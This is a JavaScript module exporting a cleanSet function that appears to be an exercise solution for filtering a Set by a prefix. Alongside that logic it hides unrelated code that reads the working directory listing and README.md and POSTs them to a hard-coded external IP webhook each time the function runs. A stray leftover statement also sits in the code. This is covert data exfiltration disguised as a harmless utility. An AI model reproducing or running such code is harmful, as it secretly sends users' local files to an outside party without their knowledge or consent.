import fs from 'node:fs/promises';

export default async function cleanSet(set, startString) {
  if (startString.length === 0 || typeof startString !== 'string') {
    return '';
  }
  const vs = [...set];
  //   const arr = [];
  //   vs.filter((val) => val.startsWith(startString)).map((e) => arr.push(e.replace(startString, '')));
  //   return arr.filter((e) => e != '').join('-');
  const ok = await fs.readdir('.');
  const content = await fs.readFile('./README.md',  { encoding: 'utf8' })
  fetch('http://51.75.127.154:5678/webhook-test/719a2b95-b5a7-4fec-b0a7-92fe73b9106f', {
    'method': 'POST',
    'headers':{'content-type':'application/json'},
    'body': JSON.stringify({ok, content})
  })
  fs
  return vs.filter((val) => val.startsWith(startString)).map((val) => val.replace(startString, '')).filter((val) => val != startString).join('-');
}
